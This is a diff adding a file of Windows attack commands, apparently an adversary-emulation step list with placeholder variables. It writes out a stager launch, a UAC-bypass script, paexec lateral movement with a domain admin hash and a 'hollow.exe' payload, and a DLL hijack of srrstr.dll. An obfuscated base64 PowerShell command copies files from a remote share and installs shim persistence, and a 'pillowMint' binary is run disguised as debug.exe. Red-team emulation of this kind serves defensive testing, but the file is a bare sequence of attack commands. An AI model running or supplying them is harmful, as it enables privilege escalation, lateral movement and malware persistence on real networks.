@@ -1,0 +1,30 @@
+powershell.exe C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\takeScreenshot.ps1
+
+
+powershell.exe -ExecutionPolicy Bypass -NoExit -File C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\stager.ps1"
+
+
+powershell.exe -c "ps"
+
+
+powershell.exe -ExecutionPolicy Bypass -NoExit -File "C:\\Users\\#{domain.admin.username}.#{domain}\\AppData\\Local\\uac-samcats.ps1"
+
+
+cmd.exe /c ".\paexec.exe \\#{itadmin.ip.address} -s -u #{domain}\#{domain.admin.username} -p #{domain.admin.hash} -c -csrc \".\hollow.exe\" hollow.exe"
+
+
+robocopy BOOSTWRITE.dll C:\\Windows\\Syswow64\\srrstr.dll &&
+cmd.exe /c "C:\\Windows\\Syswow64\\SystemPropertiesAdvanced.exe"
+
+
+powershell.exe -noprofile -encodedCommand "JABkAGwAbAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAiAFwAXAB0AHMAYwBsAGkAZQBuAHQAXABYAFwAYgBpAG4AMwAyADkALgB0AG0AcAAiACAALQBFAG4AYwBvAGQAaQBuAGcAIABCAHkAdABlADsAIABOAGUAdwAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsATABNADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAEQAUgBNAFwAIgAgAC0ATgBhAG0AZQAgACIANAAiACAAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAQgBpAG4AYQByAHkAIAAtAFYAYQBsAHUAZQAgACQAZABsAGwAIAAtAEYAbwByAGMAZQA7ACAAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABkAGwAbAAzADIAOQAuAGQAbABsACIAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAIgAgAC0ARgBvAHIAYwBlADsAIABDAG8AcAB5AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAXABcAHQAcwBjAGwAaQBlAG4AdABcAFgAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgAgAC0ARABlAHMAdABpAG4AYQB0AGkAbwBuACAAIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcAAiACAALQBGAG8AcgBjAGUAOwAgACAAJgAgAHMAZABiAGkAbgBzAHQALgBlAHgAZQAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAGQAYgBFADMANwA2AC4AdABtAHAAIgA7AA=="
+
+
+powershell.exe -c "restart-computer -force"
+
+
+Move-Item pillowMint.exe debug.exe;
+.\debug.exe;
+
+
+.\7za.exe a log log.txt;
